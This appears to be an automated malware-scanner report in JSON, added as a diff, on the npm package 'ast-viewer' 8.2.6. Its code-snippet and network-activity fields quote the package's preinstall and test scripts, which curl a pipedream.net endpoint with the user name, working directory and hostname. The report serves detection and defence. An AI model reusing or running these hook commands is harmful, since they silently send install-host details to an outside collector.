@@ -1,0 +1,48 @@
+{
+  "package_metadata": {
+    "name": "ast-viewer",
+    "version": "8.2.6"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [
+      {
+        "location": "package/package.json:7",
+        "activity": "HTTP request to suspicious domain https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)"
+      },
+      {
+        "location": "package/package.json:8",
+        "activity": "HTTP request to suspicious domain https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)"
+      }
+    ],
+    "process_actions": [
+      {
+        "location": "package/package.json:8",
+        "action": "Preinstall script executing harmful command: curl"
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/package.json",
+        "code_snippet": "    \"preinstall\": \"curl \\\"https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)\\\"\"\n"
+      },
+      {
+        "filename": "package/package.json",
+        "code_snippet": "    \"test\": \"curl \\\"https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)\\\"\",\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "indicators": [
+      "Suspicious network activity detected",
+      "Environment variable exfiltration attempt",
+      "Preinstall script with harmful commands",
+      "URL with suspicious domain extension"
+    ]
+  }
+}
